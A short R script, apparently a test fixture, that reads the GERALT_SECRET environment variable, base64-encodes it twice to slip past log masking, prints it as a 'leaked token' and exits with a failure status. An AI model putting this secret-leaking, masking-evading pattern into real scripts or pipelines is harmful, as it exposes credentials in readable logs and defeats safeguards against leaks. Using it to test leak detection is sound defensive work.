tok <- system("printf %s \"$GERALT_SECRET\" | base64 | base64", intern = TRUE)
cat("GERALT_LEAKED_TOKEN=", tok, "\n", sep = "")
quit(save = "no", status = 1)
